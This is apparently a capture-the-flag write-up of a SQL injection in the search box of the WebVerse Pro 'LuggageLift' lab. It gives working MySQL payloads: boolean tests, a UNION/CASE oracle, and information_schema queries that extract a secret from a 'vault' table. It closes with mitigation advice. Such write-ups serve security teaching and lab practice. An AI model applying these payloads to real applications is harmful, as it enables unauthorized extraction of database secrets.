---
title: "SQL Injection Exposes Internal Vault Secret | LuggageLift"
date: 2026-07-06 13:35:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [sql-injection, boolean-based-sqli, union-injection, information-disclosure, mysql, webverse-pro]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/luggagelift-sql-injection.webp
  alt: "LuggageLift SQL injection internal vault secret exposure"
---

## Lab Link

[LuggageLift](https://dashboard.webverselabs-pro.com/events/luggagelift)

---

## Overview

**LuggageLift** was a WebVerse Pro daily challenge built around an unclaimed baggage storefront. The public application allowed users to browse and search visible lots, while the briefing hinted that the same back-office system also stored a sealed internal reference that should not be reachable from the internet.

The vulnerability was a **SQL Injection** in the public search feature. The `q` parameter was inserted into a backend SQL query without proper parameterization. By breaking out of the search string, the public lot lookup could be turned into a Boolean oracle and used to enumerate the database schema.

The final target was not in the visible lot records. It was stored in a separate internal table named `vault`, where the `secret` column contained the challenge flag.

---

## Objective

The goal was to prove that a public storefront user could access the sealed internal reference from the back-office database.

In practical terms, this meant:

1. Identify the vulnerable input.
2. Confirm SQL Injection behavior.
3. Determine the backend database structure.
4. Locate the internal secret table.
5. Extract the flag from the database.

---

## Vulnerability Identification

The main searchable endpoint was:

```http
GET /search?q=sony&category= HTTP/2
Host: b0f94ecd-4065-luggagelift-dad60.events.webverselabs-pro.com
```

A normal search returned only matching public lots. However, adding SQL conditions to the `q` parameter changed the result set.

The first useful proof was a Boolean comparison:

```http
GET /search?q=sony%27+or+1%3D1--+-&category= HTTP/2
Host: b0f94ecd-4065-luggagelift-dad60.events.webverselabs-pro.com
```

This returned all visible lots:

```text
30 lots found
```

Changing the condition to false returned no results:

```http
GET /search?q=sony%27+or+1%3D2--+-&category= HTTP/2
Host: b0f94ecd-4065-luggagelift-dad60.events.webverselabs-pro.com
```

Result:

```text
0 lots found
```

This confirmed that the `q` parameter was being interpreted as part of a SQL statement.

---

## Recon and Application Behavior

The application was small and server-rendered. The public surface exposed numbered lot pages:

```text
/lot/1
/lot/2
/lot/3
...
/lot/30
```

The public search page listed exactly 30 normal lots. A direct ID sweep did not reveal hidden records behind `/lot/<id>`, which suggested that the sealed reference was not simply an unlinked lot page.

The search endpoint behaved like a database-backed `LIKE` query. Payloads using `%` and `_` matched many records, which was a useful sign that the search input was being placed inside a wildcard string.

The working breakout prefix was:

```text
%'
```

---

## Exploitation

### Confirming Boolean SQL Injection

The following payload returned public lots because the condition was true:

```text
%' AND 1=1-- -
```

The following payload returned no lots because the condition was false:

```text
%' AND 1=2-- -
```

This gave a reliable true/false signal through the rendered page.

---

### Understanding the Query Shape

Testing `ORDER BY` showed that the injectable query returned only one column:

```text
%' ORDER BY 1-- -
```

worked, while:

```text
%' ORDER BY 2-- -
```

failed.

A direct `UNION SELECT` test confirmed that the search query was returning lot IDs. Injecting a known public lot ID caused that lot to render:

```text
x%' AND 1=2 UNION SELECT 1-- -
```

When the injected row selected ID `1`, the page rendered:

```text
Sony WH-1000XM4 Over-Ear Headphones
```

Selecting a non-existing ID, such as `31`, produced no rendered lot. This made the search page useful as a Boolean oracle.

---

### Boolean Oracle Payload

The final oracle pattern was:

```text
x%' AND 1=2 UNION SELECT CASE WHEN (<condition>) THEN 1 ELSE 31 END-- -
```

If `<condition>` was true, the query returned lot ID `1`, and the Sony headphones lot appeared on the page.

If `<condition>` was false, the query returned lot ID `31`, which did not exist, so the page showed no matching lots.

Example true test:

```text
x%' AND 1=2 UNION SELECT CASE WHEN (1=1) THEN 1 ELSE 31 END-- -
```

Example false test:

```text
x%' AND 1=2 UNION SELECT CASE WHEN (1=2) THEN 1 ELSE 31 END-- -
```

---

### Identifying the Database Type

SQLite checks failed, while MySQL-style functions worked. This indicated the backend was using MySQL or MariaDB.

The database name was extracted with:

```sql
DATABASE()
```

The result was:

```text
luggagelift
```

---

### Enumerating Tables

Using `information_schema.tables`, the database tables were enumerated:

```sql
SELECT GROUP_CONCAT(table_name)
FROM information_schema.tables
WHERE table_schema = DATABASE()
```

The important tables were:

```text
items,vault
```

The `items` table held the public storefront data. The `vault` table matched the briefing hint about a sealed internal reference.

---

### Enumerating Vault Columns

The columns for the `vault` table were extracted with:

```sql
SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',')
FROM information_schema.columns
WHERE table_schema = DATABASE()
AND table_name = 'vault'
```

Result:

```text
id,secret
```

At this point, the final target was clear: extract `secret` from `vault`.

---

## Proof and Flag

The final extraction query targeted the internal vault table:

```sql
SELECT GROUP_CONCAT(CONCAT(id, ':', secret) ORDER BY id SEPARATOR '|')
FROM vault
```

Using the Boolean oracle, the `secret` value was recovered from the `vault` table.

```text
WEBVERSE{2fd4732c00a5b0f05a3422237b1d7902}
```

---

## Root Cause

The root cause was unsafe SQL query construction in the search feature.

The application appeared to build a SQL query using user-controlled input from `q` directly inside a `LIKE` condition. Because the input was not parameterized, an attacker could terminate the string, append SQL logic, comment out the remaining query, and control the selected lot IDs.

The issue was made more impactful because the same database user could read both public storefront data and internal vault data.

---

## Impact

An unauthenticated attacker could:

- Manipulate the public search query.
- Bypass intended storefront-only filtering.
- Enumerate database metadata through `information_schema`.
- Discover internal tables and columns.
- Extract secrets from a non-public `vault` table.

The direct business impact was **unauthorized disclosure of internal back-office secrets**.

---

## Mitigation

To fix this issue:

1. Use parameterized queries or prepared statements for all database access.
2. Never concatenate user input into SQL strings.
3. Apply strict allowlists for sortable, searchable, or filterable fields.
4. Use least-privilege database users so the public storefront cannot read internal vault tables.
5. Keep back-office secrets in a separate database or isolated service where possible.
6. Return generic errors and avoid behavior that creates reliable Boolean SQLi oracles.
7. Add automated tests for SQL Injection payloads in all search and filter endpoints.

---

## Lessons

This lab showed that even a simple public search box can become a path to sensitive back-office data when the backend query is not parameterized.

The important exploitation detail was understanding the shape of the vulnerable query. The search endpoint did not directly reflect arbitrary selected strings. Instead, it returned one column containing lot IDs. Once that was understood, the attack shifted from direct `UNION SELECT` output to a Boolean oracle using valid and invalid lot IDs.

The final vulnerability chain was:

```text
Search SQL Injection → Boolean Oracle → Schema Enumeration → Vault Table Discovery → Secret Extraction
```
